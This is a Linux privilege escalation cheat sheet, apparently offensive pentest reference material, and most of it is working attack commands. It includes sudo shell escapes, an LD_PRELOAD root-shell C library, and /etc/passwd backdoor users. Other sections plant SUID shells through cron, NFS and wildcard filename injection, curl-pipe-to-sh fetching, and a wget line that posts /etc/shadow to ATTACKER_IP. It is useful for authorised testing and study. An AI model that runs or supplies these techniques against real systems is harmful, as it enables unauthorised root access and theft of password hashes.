# Linux Privilege Escalation Techniques

Core Linux privilege escalation vectors. Ordered by reliability and safety -- start from the top.

---

## 1. Automated Enumeration

Deploy enumeration scripts first to identify low-hanging fruit.

### LinPEAS

```bash
# Transfer and run
curl -L https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh -o /tmp/lp.sh
chmod +x /tmp/lp.sh && /tmp/lp.sh | tee /tmp/linpeas.out

# Or run without writing to disk
curl -L https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh | sh
```

Color key: RED/YELLOW = high-probability privesc vector. Focus on these first.

### pspy -- Process Snooping Without Root

Monitors `/proc` for new processes. Catches cron jobs, scheduled tasks, and scripts run by
other users that don't show up in `crontab`.

```bash
# Download appropriate architecture
curl -L https://github.com/DominicBreuker/pspy/releases/latest/download/pspy64 -o /tmp/pspy
chmod +x /tmp/pspy && /tmp/pspy
```

Watch for processes running as root (UID=0) that execute scripts or binaries you can write to.

### Linux Exploit Suggester

```bash
curl -L https://raw.githubusercontent.com/mzet-/linux-exploit-suggester/master/linux-exploit-suggester.sh -o /tmp/les.sh
chmod +x /tmp/les.sh && /tmp/les.sh
```

---

## 2. Sudo Abuse

### Enumerate

```bash
sudo -l
# Look for: NOPASSWD entries, specific binaries, env_keep variables
```

### GTFOBins Exploitation

Reference: https://gtfobins.github.io -- search for any binary listed in `sudo -l`.

Common examples:

```bash
# vim
sudo vim -c ':!/bin/bash'

# find
sudo find . -exec /bin/bash \; -quit

# awk
sudo awk 'BEGIN {system("/bin/bash")}'

# python/python3
sudo python3 -c 'import os; os.system("/bin/bash")'

# less/more
sudo less /etc/passwd
!/bin/bash

# nmap (older versions with --interactive)
sudo nmap --interactive
!sh

# env
sudo env /bin/bash

# ftp
sudo ftp
!/bin/bash

# zip
sudo zip /tmp/x.zip /tmp/x -T --unzip-command="sh -c /bin/bash"

# tar
sudo tar cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/bash

# perl
sudo perl -e 'exec "/bin/bash";'

# ruby
sudo ruby -e 'exec "/bin/bash"'

# man
sudo man man
!/bin/bash

# journalctl (needs small terminal to trigger pager)
sudo journalctl
!/bin/bash

# systemctl (triggers pager for long output)
sudo systemctl status
!/bin/bash

# apache2 (read files)
sudo apache2 -f /etc/shadow

# wget (write files)
sudo wget --post-file=/etc/shadow http://ATTACKER_IP:8000/
```

### LD_PRELOAD Exploitation

When `sudo -l` shows `env_keep += LD_PRELOAD`:

```c
// /tmp/shell.c
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>

void _init() {
    unsetenv("LD_PRELOAD");
    setgid(0);
    setuid(0);
    system("/bin/bash");
}
```

```bash
gcc -fPIC -shared -o /tmp/shell.so /tmp/shell.c -nostartfiles
sudo LD_PRELOAD=/tmp/shell.so <any-allowed-binary>
```

### LD_LIBRARY_PATH Exploitation

When `env_keep += LD_LIBRARY_PATH` and a sudo binary loads shared libraries:

```bash
# Find which libraries the binary loads
ldd /usr/bin/allowed-binary

# Create malicious version of one
# (same shell.c as above, compiled to match library name)
gcc -fPIC -shared -o /tmp/libfoo.so shell.c -nostartfiles
sudo LD_LIBRARY_PATH=/tmp /usr/bin/allowed-binary
```

### Sudo Version Exploits

```bash
sudo --version
```

| Version | Exploit | CVE |
|---------|---------|-----|
| < 1.8.28 | Runas ALL bypass (-u#-1) | CVE-2019-14287 |
| 1.8.2-1.8.31p2, 1.9.0-1.9.5p1 | Baron Samedit (heap overflow) | CVE-2021-3156 |

---

## 3. SUID/SGID Binary Exploitation

### Find SUID/SGID Binaries

```bash
find / -type f -perm -04000 -ls 2>/dev/null   # SUID
find / -type f -perm -02000 -ls 2>/dev/null   # SGID
```

Cross-reference every binary against https://gtfobins.github.io/?#suid

### Common SUID Exploits

```bash
# base64 -- read any file
LFILE=/etc/shadow
base64 "$LFILE" | base64 -d

# cp -- overwrite /etc/passwd or /etc/shadow
# (prepare modified file first)
cp /tmp/modified_passwd /etc/passwd

# find
find . -exec /bin/bash -p \; -quit

# bash/dash with SUID
/usr/bin/bash -p

# python with SUID
python3 -c 'import os; os.execl("/bin/bash", "bash", "-p")'

# php
php -r "pcntl_exec('/bin/bash', ['-p']);"
```

### Custom SUID Binary Analysis

If a non-standard binary has SUID:

```bash
# Check what it does
strings /usr/local/bin/custom-suid
strace /usr/local/bin/custom-suid 2>&1 | head -50
ltrace /usr/local/bin/custom-suid 2>&1 | head -50

# Look for relative command calls (PATH hijack opportunity)
strings /usr/local/bin/custom-suid | grep -E '^[a-z]'
```

### Modify /etc/passwd (if writable or writable via SUID)

```bash
# Generate password hash
openssl passwd -6 -salt xyz newpassword
# or
openssl passwd -1 -salt xyz newpassword

# Add root-equivalent user
echo 'pwned:$6$xyz$HASH:0:0:root:/root:/bin/bash' >> /etc/passwd

# Or replace root's password field
```

---

## 4. Linux Capabilities

### Enumerate

```bash
getcap -r / 2>/dev/null
```

### Exploit cap_setuid

```bash
# python3 with cap_setuid+ep
python3 -c 'import os; os.setuid(0); os.system("/bin/bash")'

# perl with cap_setuid+ep
perl -e 'use POSIX qw(setuid); POSIX::setuid(0); exec "/bin/bash";'

# vim with cap_setuid+ep
vim -c ':py3 import os; os.setuid(0); os.execl("/bin/bash", "bash", "-c", "reset; exec bash")'

# node with cap_setuid+ep
node -e 'process.setuid(0); require("child_" + "process").spawn("/bin/bash", {stdio: [0, 1, 2]})'
```

### Exploit cap_dac_read_search

```bash
# Read any file on the system (bypasses DAC read permissions)
# If tar has this capability:
tar czf /tmp/shadow.tar.gz /etc/shadow
tar xzf /tmp/shadow.tar.gz -C /tmp/
cat /tmp/etc/shadow
```

### Exploit cap_sys_admin

```bash
# Mount host filesystem (useful in container escape too)
mkdir /tmp/hostfs
mount /dev/sda1 /tmp/hostfs
```

### Exploit cap_net_raw

```bash
# Packet capture -- sniff credentials on the wire
tcpdump -i any -w /tmp/capture.pcap
```

---

## 5. Cron Job Exploitation

### Enumerate

```bash
cat /etc/crontab
ls -la /etc/cron.d/
ls -la /etc/cron.daily/ /etc/cron.hourly/ /etc/cron.weekly/ /etc/cron.monthly/
ls -la /var/spool/cron/crontabs/
systemctl list-timers --all 2>/dev/null

# Use pspy to catch jobs not visible in crontab
```

### Exploit Writable Cron Scripts

```bash
# If root runs /opt/backup.sh and you can write to it:
echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' >> /opt/backup.sh

# Wait for cron execution, then:
/tmp/bash -p
```

### Exploit PATH in Crontab

If crontab has `PATH=/home/user/bin:/usr/bin:/bin` and root runs a command by name (not
absolute path), create a malicious version in the first writable PATH entry.

### Exploit Missing Scripts

If crontab references a script that doesn't exist and you can create it:

```bash
echo -e '#!/bin/bash\ncp /bin/bash /tmp/bash; chmod +s /tmp/bash' > /path/to/missing-script.sh
chmod +x /path/to/missing-script.sh
```

---

## 6. Kernel Exploits

**Last resort.** Can crash the system, corrupt memory, or trigger panic.

### Identify Kernel

```bash
uname -r
cat /proc/version
```

### Notable Kernel CVEs

| CVE | Name | Kernel Versions | Type |
|-----|------|----------------|------|
| CVE-2016-5195 | Dirty COW | 2.6.22 - 4.8.3 | Race condition, write to read-only mappings |
| CVE-2021-4034 | PwnKit (pkexec) | All with polkit | SUID pkexec memory corruption |
| CVE-2022-0847 | Dirty Pipe | 5.8 - 5.16.11 | Pipe buffer flag overwrite |
| CVE-2022-0492 | cgroup escape | < 5.17 | cgroup v1 release_agent (container escape too) |
| CVE-2022-2588 | nf_tables | 3.18 - 5.19 | Use-after-free in route4 |
| CVE-2023-0386 | OverlayFS | 5.11 - 6.2 | SUID copy-up in overlayfs |
| CVE-2023-2008 | udmabuf | 5.19 - 6.3 | Buffer overflow |
| CVE-2023-32233 | nf_tables | 5.1 - 6.4 | Use-after-free in nf_tables |
| CVE-2023-35829 | io_uring | 5.10 - 6.1 | Use-after-free |
| CVE-2024-1086 | nf_tables "Flipping Pages" | 5.14 - 6.6 | UAF in nft_verdict_init (99.4% success, actively exploited by RansomHub/Akira) |
| CVE-2024-27397 | nf_tables race | 5.x - 6.x | nf_tables race condition (Google kCTF PoC) |
| CVE-2024-26809 | nf_tables pipapo | 5.x - 6.x | Double-free in set clone/destroy |
| CVE-2024-53141 | netfilter ipset | 2.7 - 6.12 | OOB access, full KASLR bypass chain |
| CVE-2024-0582 | io_uring | 6.4 - 6.7 | PBUF_RING UAF via mmap/free race |
| CVE-2024-36971 | netfilter | 5.4 - 6.10 | UAF in routing subsystem |
| CVE-2025-21756 | vsock "Attack of the Vsock" | < 6.6.79, < 6.12.16 | Refcount UAF, guest-to-host VM escape |
| CVE-2024-50264 | AF_VSOCK | 4.8+ | connect/signal race UAF (Pwnie 2025 "Best Privesc") |
| CVE-2025-38617 | packet socket | multiple | UAF, needs only CAP_NET_RAW (available via userns) |
| CVE-2026-23272 | nf_tables | 6.x | RCU race condition, refcount desync |

### Compile and Run

```bash
# On target (if gcc available)
gcc exploit.c -o exploit -static
./exploit

# Cross-compile on attacker for target arch
gcc -static -m64 exploit.c -o exploit   # 64-bit
gcc -static -m32 exploit.c -o exploit   # 32-bit
```

**Note:** CVE-2024-1086 was added to CISA KEV and is actively exploited by ransomware groups.
The io_uring "Curing" rootkit (ARMO, 2025) is not a CVE but a design blind spot -- io_uring
ops bypass all syscall-monitoring tools (Falco, Defender). Mitigate with `sysctl io_uring_disabled=2`
on systems that don't need io_uring.

### Mitigations to Check

```bash
# KASLR (Kernel Address Space Layout Randomization)
cat /proc/sys/kernel/randomize_va_space

# SMEP/SMAP (Supervisor Mode Execution/Access Prevention)
grep -oE 'smep|smap' /proc/cpuinfo

# SELinux/AppArmor status
getenforce 2>/dev/null
aa-status 2>/dev/null

# Seccomp
grep Seccomp /proc/self/status
```

---

## 7. PATH Hijacking

When a SUID binary or root cron job calls a command by name (not absolute path):

```bash
# Identify the command called
strings /usr/local/bin/suid-binary | grep -vE '^[^a-z]'
# e.g., shows: system("service apache2 start")

# Hijack
export PATH=/tmp:$PATH
echo -e '#!/bin/bash\n/bin/bash -p' > /tmp/service
chmod +x /tmp/service

# Execute the SUID binary -- it calls our "service" instead
/usr/local/bin/suid-binary
```

Works on any SUID binary using `system()`, `popen()`, or `exec*p()` with relative paths.

---

## 8. NFS Exploitation

### Enumerate

```bash
cat /etc/exports
# Look for: no_root_squash
```

### Exploit no_root_squash

From attacker machine (as root):

```bash
showmount -e TARGET_IP
mount -o rw TARGET_IP:/share /tmp/nfs

# Option 1: SUID shell
echo 'int main(){setuid(0);setgid(0);system("/bin/bash");return 0;}' > /tmp/nfs/shell.c
gcc /tmp/nfs/shell.c -o /tmp/nfs/shell
chmod +s /tmp/nfs/shell

# Option 2: SUID bash copy
cp /bin/bash /tmp/nfs/bash
chmod +s /tmp/nfs/bash
```

On target: `/share/shell` or `/share/bash -p`

---

## 9. Writable Sensitive Files

```bash
# World-writable sensitive files
ls -la /etc/passwd /etc/shadow /etc/sudoers 2>/dev/null

# Writable systemd units (create service running as root)
find /etc/systemd/system/ /lib/systemd/system/ -writable -type f 2>/dev/null

# Writable authorized_keys (add your key)
find / -name authorized_keys -writable 2>/dev/null

# Writable /etc/ld.so.conf.d/ (shared library injection)
ls -la /etc/ld.so.conf.d/ 2>/dev/null
```

---

## 10. Wildcard Injection

### tar with Wildcards

If root runs `tar czf /tmp/backup.tar.gz *` in a directory you control:

```bash
# In the target directory
echo "" > "--checkpoint=1"
echo "" > "--checkpoint-action=exec=sh shell.sh"
echo '#!/bin/bash' > shell.sh
echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' >> shell.sh
```

### chown/chmod with Wildcards

If root runs `chown user:user *` in a directory you control:

```bash
echo "" > "--reference=/etc/passwd"
# This makes chown use /etc/passwd's ownership for all files
```

### rsync with Wildcards

If root runs `rsync -a * /backup/`:

```bash
echo "" > "-e sh shell.sh"
```
